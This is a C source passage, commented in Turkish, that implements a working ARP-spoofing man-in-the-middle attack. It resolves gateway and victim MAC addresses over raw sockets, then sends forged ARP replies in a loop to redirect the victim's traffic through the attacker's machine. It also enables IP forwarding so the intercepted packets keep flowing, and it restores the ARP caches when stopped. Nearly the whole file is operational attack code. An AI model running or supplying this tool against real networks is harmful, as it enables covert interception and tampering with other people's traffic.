    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ifr.ifr_addr.sa_family = AF_INET;
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) { close(fd); return -1; }
    struct sockaddr_in *sa = (struct sockaddr_in *)&ifr.ifr_addr;
    strncpy(ip_out, inet_ntoa(sa->sin_addr), ip_len - 1);
    close(fd);
    return 0;
}

/* --- ARP resolve: Bir IP'nin MAC adresini bul --- */
static int arp_resolve_mac(const char *ip, unsigned char *mac_out, const char *iface) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (fd < 0) {
        fprintf(stderr, "[ARP_SPOOF] Raw socket acilamadi (root/cap_net_raw gerekli)\n");
        return -1;
    }

    unsigned int ifindex = if_nametoindex(iface);
    if (ifindex == 0) { close(fd); return -1; }

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family   = AF_PACKET;
    addr.sll_ifindex  = ifindex;
    addr.sll_protocol = htons(ETH_P_ARP);

    /* Kendi MAC ve IP */
    unsigned char own_mac[6];
    char own_ip[16] = {0};
    if (spoof_get_own_mac(iface, own_mac) < 0) { close(fd); return -1; }
    if (spoof_get_own_ip(iface, own_ip, sizeof(own_ip)) < 0) { close(fd); return -1; }

    /* ARP Request paketi oluştur (Ethernet header + ARP header = 42 bytes) */
    unsigned char buf[64];
    memset(buf, 0, sizeof(buf));

    /* Ethernet header */
    memset(buf, 0xff, 6);                   /* dst: broadcast */
    memcpy(buf + 6, own_mac, 6);            /* src: bizim MAC */
    buf[12] = 0x08; buf[13] = 0x06;         /* EtherType: ARP */

    /* ARP header */
    buf[14] = 0x00; buf[15] = 0x01;         /* Hardware type: Ethernet */
    buf[16] = 0x08; buf[17] = 0x00;         /* Protocol type: IPv4 */
    buf[18] = 0x06;                          /* Hardware address length */
    buf[19] = 0x04;                          /* Protocol address length */
    buf[20] = 0x00; buf[21] = 0x01;         /* Opcode: ARP Request */

    memcpy(buf + 22, own_mac, 6);            /* Sender MAC */
    struct in_addr src_in;
    inet_pton(AF_INET, own_ip, &src_in);
    memcpy(buf + 28, &src_in, 4);            /* Sender IP */

    memset(buf + 32, 0x00, 6);               /* Target MAC: unknown */
    struct in_addr dst_in;
    inet_pton(AF_INET, ip, &dst_in);
    memcpy(buf + 38, &dst_in, 4);            /* Target IP */

    /* Gönder */
    if (sendto(fd, buf, 42, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }

    /* Yanıt bekle (timeout 3 sn) */
    struct timeval tv = {3, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    unsigned char resp[128];
    int result = -1;
    for (int attempt = 0; attempt < 100; attempt++) {
        int n = recvfrom(fd, resp, sizeof(resp), 0, NULL, NULL);
        if (n <= 0) break;
        if (n < 42) continue;

        /* ARP Reply mi? */
        int arp_opcode = (resp[20] << 8) | resp[21];
        if (arp_opcode != 2) continue;

        /* Doğru IP'den mi geliyor? */
        char resp_ip[16];
        snprintf(resp_ip, sizeof(resp_ip), "%d.%d.%d.%d",
                 resp[28], resp[29], resp[30], resp[31]);
        if (strcmp(resp_ip, ip) == 0) {
            memcpy(mac_out, resp + 22, 6);  /* Sender MAC */
            result = 0;
            break;
        }
    }
    close(fd);
    return result;
}

/* --- Sahte ARP Reply gönder --- */
static void send_arp_reply(int raw_fd, const char *iface,
                           const unsigned char *src_mac, const char *src_ip,
                           const unsigned char *dst_mac, const char *dst_ip) {
    unsigned char buf[42];
    memset(buf, 0, sizeof(buf));

    /* Ethernet header */
    memcpy(buf, dst_mac, 6);                 /* dst MAC */
    memcpy(buf + 6, src_mac, 6);             /* src MAC (bizim MAC) */
    buf[12] = 0x08; buf[13] = 0x06;         /* EtherType: ARP */

    /* ARP Reply */
    buf[14] = 0x00; buf[15] = 0x01;         /* Hardware: Ethernet */
    buf[16] = 0x08; buf[17] = 0x00;         /* Protocol: IPv4 */
    buf[18] = 0x06; buf[19] = 0x04;         /* Lengths */
    buf[20] = 0x00; buf[21] = 0x02;         /* Opcode: Reply */

    memcpy(buf + 22, src_mac, 6);            /* Sender MAC (bizim MAC) */
    struct in_addr sin;
    inet_pton(AF_INET, src_ip, &sin);
    memcpy(buf + 28, &sin, 4);               /* Sender IP (sahte — gateway veya hedef IP) */

    memcpy(buf + 32, dst_mac, 6);            /* Target MAC */
    inet_pton(AF_INET, dst_ip, &sin);
    memcpy(buf + 38, &sin, 4);               /* Target IP */

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family   = AF_PACKET;
    addr.sll_ifindex  = if_nametoindex(iface);
    addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(addr.sll_addr, dst_mac, 6);
    addr.sll_halen    = 6;

    sendto(raw_fd, buf, 42, 0, (struct sockaddr *)&addr, sizeof(addr));
}

/* --- ARP Spoof döngüsü (ayrı thread) --- */
static void *arp_spoof_loop(void *arg) {
    (void)arg;

    int raw_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (raw_fd < 0) {
        fprintf(stderr, "[ARP_SPOOF] Raw socket acilamadi\n");
        g_arp_spoof_running = 0;
        return NULL;
    }
    g_arp_raw_fd = raw_fd;

    /* Gateway MAC'ini çöz */
    fprintf(stderr, "[ARP_SPOOF] Gateway MAC cozuluyor: %s\n", g_spoof_gateway_ip);
    if (arp_resolve_mac(g_spoof_gateway_ip, g_gateway_mac, g_spoof_iface) < 0) {
        fprintf(stderr, "[ARP_SPOOF] Gateway MAC bulunamadi: %s\n", g_spoof_gateway_ip);
        close(raw_fd);
        g_arp_raw_fd = -1;
        g_arp_spoof_running = 0;
        return NULL;
    }
    fprintf(stderr, "[ARP_SPOOF] Gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
            g_gateway_mac[0], g_gateway_mac[1], g_gateway_mac[2],
            g_gateway_mac[3], g_gateway_mac[4], g_gateway_mac[5]);

    /* Hedef cihaz MAC'ini çöz */
    fprintf(stderr, "[ARP_SPOOF] Hedef MAC cozuluyor: %s\n", g_spoof_target_ip);
    if (arp_resolve_mac(g_spoof_target_ip, g_target_mac, g_spoof_iface) < 0) {
        fprintf(stderr, "[ARP_SPOOF] Hedef MAC bulunamadi: %s\n", g_spoof_target_ip);
        close(raw_fd);
        g_arp_raw_fd = -1;
        g_arp_spoof_running = 0;
        return NULL;
    }
    fprintf(stderr, "[ARP_SPOOF] Hedef MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
            g_target_mac[0], g_target_mac[1], g_target_mac[2],
            g_target_mac[3], g_target_mac[4], g_target_mac[5]);

    /* Kendi MAC'imizi al */
    spoof_get_own_mac(g_spoof_iface, g_my_mac);

    fprintf(stderr, "[ARP_SPOOF] Baslatildi: %s <-> %s (iface: %s)\n",
            g_spoof_target_ip, g_spoof_gateway_ip, g_spoof_iface);

    while (g_arp_spoof_running) {
        /* Hedefe söyle: "Gateway benim" */
        send_arp_reply(raw_fd, g_spoof_iface,
                       g_my_mac, g_spoof_gateway_ip,      /* src: bizim MAC, gateway IP */
                       g_target_mac, g_spoof_target_ip);   /* dst: hedef MAC, hedef IP */

        /* Gateway'e söyle: "Hedef benim" */
        send_arp_reply(raw_fd, g_spoof_iface,
                       g_my_mac, g_spoof_target_ip,        /* src: bizim MAC, hedef IP */
                       g_gateway_mac, g_spoof_gateway_ip); /* dst: gateway MAC, gateway IP */

        /* 2 saniyede bir tekrarla (ARP cache yenileme) */
        for (int i = 0; i < 20 && g_arp_spoof_running; i++)
            platform_sleep_ms(100);
    }

    /* ===== TEMİZLİK: Gerçek ARP bilgilerini geri yükle ===== */
    fprintf(stderr, "[ARP_SPOOF] ARP cache geri yukleniyor...\n");

    /* Hedefe gerçek gateway MAC'ini gönder */
    send_arp_reply(raw_fd, g_spoof_iface,
                   g_gateway_mac, g_spoof_gateway_ip,
                   g_target_mac, g_spoof_target_ip);

    /* Gateway'e gerçek hedef MAC'ini gönder */
    send_arp_reply(raw_fd, g_spoof_iface,
                   g_target_mac, g_spoof_target_ip,
                   g_gateway_mac, g_spoof_gateway_ip);

    /* Birkaç kere daha gönder (güvenilirlik) */
    for (int r = 0; r < 3; r++) {
        platform_sleep_ms(200);
        send_arp_reply(raw_fd, g_spoof_iface,
                       g_gateway_mac, g_spoof_gateway_ip,
                       g_target_mac, g_spoof_target_ip);
        send_arp_reply(raw_fd, g_spoof_iface,
                       g_target_mac, g_spoof_target_ip,
                       g_gateway_mac, g_spoof_gateway_ip);
    }

    close(raw_fd);
    g_arp_raw_fd = -1;
    fprintf(stderr, "[ARP_SPOOF] Durduruldu, ARP cache temizlendi.\n");
    return NULL;
}

/* --- IP Forwarding aç/kapa (/proc/sys/net/ipv4/ip_forward) --- */
void enable_ip_forward(void) {
    /* Eski değeri sakla */
    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "r");
    if (f) {
        if (fscanf(f, "%d", &g_ip_forward_original) != 1)
            g_ip_forward_original = 0;
        fclose(f);
    }
    /* Aç */
    f = fopen("/proc/sys/net/ipv4/ip_forward", "w");
    if (f) {
        fprintf(f, "1");
        fclose(f);
        fprintf(stderr, "[ARP_SPOOF] IP forwarding acildi (onceki: %d)\n", g_ip_forward_original);
    } else {
        fprintf(stderr, "[ARP_SPOOF] IP forwarding acilamadi (root gerekli)\n");
    }
}

void disable_ip_forward(void) {
    /* Eski değere geri dön */
    int val = (g_ip_forward_original > 0) ? 1 : 0;
    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "w");
    if (f) {
        fprintf(f, "%d", val);
        fclose(f);
        fprintf(stderr, "[ARP_SPOOF] IP forwarding eski degerine donduruldu: %d\n", val);
    }
}

/* --- Public API --- */
void arp_spoof_start(const char *target_ip, const char *gateway_ip, const char *iface) {
    if (g_arp_spoof_running) return;
    if (!target_ip || !gateway_ip || !iface) return;

    strncpy(g_spoof_target_ip, target_ip, sizeof(g_spoof_target_ip) - 1);
    strncpy(g_spoof_gateway_ip, gateway_ip, sizeof(g_spoof_gateway_ip) - 1);
    strncpy(g_spoof_iface, iface, sizeof(g_spoof_iface) - 1);

    /* IP forwarding aç (yoksa MITM paketleri düşer) */
    enable_ip_forward();

    g_arp_spoof_running = 1;
    platform_thread_create(&g_arp_thread, arp_spoof_loop, NULL);
    platform_thread_detach(g_arp_thread);
}

void arp_spoof_stop(void) {
    if (!g_arp_spoof_running) return;
    g_arp_spoof_running = 0;

    /* Thread'in temizlik yapması için bekle */
    platform_sleep_ms(1500);

    /* IP forwarding'i eski haline getir */
    disable_ip_forward();

    g_spoof_target_ip[0] = '\0';
    fprintf(stderr, "[ARP_SPOOF] Tamamen durduruldu.\n");
}

int arp_spoof_is_running(void) {
    return g_arp_spoof_running;
}

const char *arp_spoof_get_target(void) {
    return g_spoof_target_ip;
}

#else /* PLATFORM_WINDOWS — stub */

void enable_ip_forward(void) {}
void disable_ip_forward(void) {}
void arp_spoof_start(const char *target_ip, const char *gateway_ip, const char *iface) {
    (void)target_ip; (void)gateway_ip; (void)iface;
    fprintf(stderr, "[ARP_SPOOF] Windows'da desteklenmiyor.\n");
}
void arp_spoof_stop(void) {}
int  arp_spoof_is_running(void) { return 0; }
const char *arp_spoof_get_target(void) { return ""; }

#endif /* PLATFORM_LINUX */